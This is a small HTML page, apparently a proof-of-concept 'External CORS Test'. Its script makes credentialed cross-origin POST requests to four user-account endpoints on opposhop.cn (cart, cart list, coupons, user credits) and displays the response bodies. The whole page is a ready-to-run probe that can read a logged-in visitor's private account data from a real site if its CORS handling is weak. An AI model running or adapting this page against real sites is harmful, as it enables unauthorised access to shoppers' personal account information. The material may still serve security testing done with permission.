<!DOCTYPE html>
<html>
<body>

<h3>External CORS Test</h3>
<button onclick="run()">Run Test</button>

<pre id="out"></pre>

<script>

const endpoints = [
"https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount",
"https://www.opposhop.cn/cn/oapi/orders/web/cart/v1/list",
"https://www.opposhop.cn/cn/oapi/users/web/coupons/count?state=1",
"https://www.opposhop.cn/cn/oapi/users/web/credits/getUserCredit"
];

function run(){

document.getElementById("out").textContent="Running...\n\n";

endpoints.forEach(url=>{

fetch(url,{
method:"POST",
credentials:"include"
})

.then(r=>r.text().then(t=>{
document.getElementById("out").textContent +=
url+"\nSTATUS: "+r.status+"\nBODY:\n"+t+"\n\n";
}))

.catch(e=>{
document.getElementById("out").textContent +=
url+"\nERROR: "+e+"\n\n";
});

});

}

</script>

</body>
</html>
